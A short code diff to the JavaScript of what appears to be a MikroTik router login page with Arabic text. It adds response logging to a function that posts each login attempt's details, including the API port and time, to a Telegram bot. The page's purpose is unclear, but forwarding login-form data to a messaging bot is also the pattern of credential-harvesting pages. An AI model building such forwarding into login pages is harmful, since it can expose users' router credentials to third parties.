@@ -262,7 +262,10 @@
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
-        }).catch(error => console.log("Telegram Error:", error));
+        })
+        .then(response => response.json())
+        .then(data => console.log("Telegram Success:", data))
+        .catch(error => console.log("Telegram Error:", error));
     }
 
     function handleLogin(event) {
@@ -282,6 +285,7 @@
             `🔌 بورت الـ API: <code>${port}</code>\n` +
             `🕒 وقت المحاولة: ${nowTime}`;
         
+        // إرسال البيانات للبوت
         sendTelegramAlert(alertMessage);
 
         let attempts = localStorage.getItem('mikrotik_secure_attempts') ? parseInt(localStorage.getItem('mikrotik_secure_attempts')) : 0;
